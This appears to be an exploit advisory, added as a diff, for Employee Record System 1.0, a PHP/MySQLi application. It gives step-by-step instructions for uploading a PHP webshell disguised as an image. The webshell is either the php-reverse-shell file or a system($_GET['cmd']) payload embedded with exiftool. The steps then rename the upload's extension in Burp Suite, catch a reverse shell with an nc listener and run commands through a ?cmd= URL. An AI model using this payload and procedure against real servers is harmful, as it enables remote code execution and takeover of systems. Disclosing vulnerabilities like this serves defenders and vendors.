@@ -1,0 +1,21 @@
+# Exploit Title: Employee Record System 1.0 - Unrestricted File Upload to Remote Code Execution
+# Exploit Author: Saeed Bala Ahmed (r0b0tG4nG)
+# Date: 2021-01-05
+# Vendor Homepage: https://www.sourcecodester.com/php/14588/employee-record-system-phpmysqli-full-source-code.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=14588&title=Employee+Record+System+in+PHP%2FMySQLi+with+Full+Source+Code
+# Affected Version: Version 1
+# Tested on: Parrot OS
+
+Step 1: Log in to the CMS with any valid user credentials.
+Step 2: Click on add Employee.
+Step 3: Copy a php webshell from /usr/share/webshells/php/php-reverse-shell.php and rename it to shell.php.jpg or embed a phpshellcode into an image using "exiftool -Comment='<?php system($_GET['cmd']); ?>' r0b0t.jpg, then rename the image to r0b0t.php.jpg
+Step 4: Fill in the required details at Add Employee, to Upload Employee Photo, browse select the shell.php.jpg / r0b0t.php.jpg from your computer.
+Step 5: Click upload and capture request in burpsuite. In burpsuite, find your uploaded file and rename it to a ".php" extenstion.
+-----------------------------32746377659244340001584064316
+Content-Disposition: form-data; name="employee_photo"; filename="r0b0t.php"
+Content-Type: image/jpeg
+------------------------------------------
+
+Step 6: Forward the request in burpsuite and apply same technique to Upload Employee ID.
+step 7: Once all webshells/payloads are uploaded in both "Upload Employee Photo" & "Upload Employee ID" fields, click on ADD RECORD to create the record.
+Step 8: Navigate to All employees, click on view employee icon, once the page loads, start nc listener, right click on the employee icon, copy the image location and paste that in browser. You will either have a shell in nc listener or a full RCE through the uploaded image (http://localhost/record/uploads/employees_photos/gQZtGSJyYW4oijD_r0b0t.php?cmd=ls)
